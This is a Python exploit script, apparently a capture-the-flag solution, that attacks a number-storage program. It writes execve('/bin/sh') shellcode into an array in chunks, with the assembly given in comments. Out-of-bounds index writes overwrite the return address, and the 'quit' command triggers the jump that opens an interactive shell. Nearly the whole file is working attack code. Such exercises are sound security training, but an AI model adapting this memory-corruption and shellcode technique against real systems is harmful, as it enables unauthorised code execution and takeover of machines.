import interact
def main():
    read_until = ['Input command: ', 'Number', 'Index']
    try:
        p = interact.Process()
        
        """
        Redirects the return address to the start of our shellcode
        """
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("32767")
        p.readuntil(read_until[2]) # Index
        p.sendline("111")
        
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("4294962216")
        p.readuntil(read_until[2]) # Index
        p.sendline("110")
        
        """
        xor esi, esi
        jmp $+6
        nop
        nop
        nop
        nop
        """
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("2425393296")
        p.readuntil(read_until[2]) # Index
        p.sendline("2")
        
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("82572849")
        p.readuntil(read_until[2]) # Index
        p.sendline("3")
        
        
        
        """
        mov bl, 0x68
        shl rbx, 8
        jmp $+6
        """
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("3242748083")
        p.readuntil(read_until[2]) # Index
        p.sendline("5")
        
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("82512099")
        p.readuntil(read_until[2]) # Index
        p.sendline("6")
        
        """
        mov bl, 0x73
        shl rbx, 8
        jmp $+6
        """
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("3242750899")
        p.readuntil(read_until[2]) # Index
        p.sendline("8")
        
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("82512099")
        p.readuntil(read_until[2]) # Index
        p.sendline("9")
        
        """
        mov bl, 0x2f
        shl rbx, 8
        jmp $+6
        """
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("3242733491")
        p.readuntil(read_until[2]) # Index
        p.sendline("11")
        
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("82512099")
        p.readuntil(read_until[2]) # Index
        p.sendline("12")
        
        """
        mov bl, 0x2f
        shl rbx, 8
        jmp $+6
        """
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("3242733491")
        p.readuntil(read_until[2]) # Index
        p.sendline("14")
        
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("82512099")
        p.readuntil(read_until[2]) # Index
        p.sendline("15")
        
        """
        mov bl, 0x6e
        shl rbx, 8
        jmp $+6
        """
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("3242749619")
        p.readuntil(read_until[2]) # Index
        p.sendline("17")
        
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("82512099")
        p.readuntil(read_until[2]) # Index
        p.sendline("18")

        
        """
        mov bl, 0x69
        shl rbx, 8
        jmp $+6
        """
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("3242748339")
        p.readuntil(read_until[2]) # Index
        p.sendline("20")
        
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("82512099")
        p.readuntil(read_until[2]) # Index
        p.sendline("21")
        
        """
        mov bl, 0x62
        shl rbx, 8
        jmp $+6
        """
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("3242746547")
        p.readuntil(read_until[2]) # Index
        p.sendline("23")
        
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("82512099")
        p.readuntil(read_until[2]) # Index
        p.sendline("24")
        """
        mov bl, 0x2f
        jmp $+6
        nop
        nop
        nop
        nop
        """
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("2425393296")
        p.readuntil(read_until[2]) # Index
        p.sendline("26")
        
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("82522035")
        p.readuntil(read_until[2]) # Index
        p.sendline("27")
             
        """
        push rsi
        push rbx
        push rsp
        pop rdi
        push 0x3b
        jmp $+6
        """
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("1599361878")
        p.readuntil(read_until[2]) # Index
        p.sendline("29")
        
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("82525034")
        p.readuntil(read_until[2]) # Index
        p.sendline("30")
        
        """
        pop rax
        xor edx, edx
        syscall
        nop
        nop
        nop

        """
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("265433432")
        p.readuntil(read_until[2]) # Index
        p.sendline("32")
        
        p.readuntil(read_until[0]) # Input command
        p.sendline("store")
        p.readuntil(read_until[1]) # Number
        p.sendline("2425393157")
        p.readuntil(read_until[2]) # Index
        p.sendline("33")
        
        
        
        
        """
        The quit command triggers the return
        """
        p.readuntil(read_until[0]) # Input command
        p.sendline("quit")
        p.interactive()
    except Exception as e:
        print(e)
        

main()
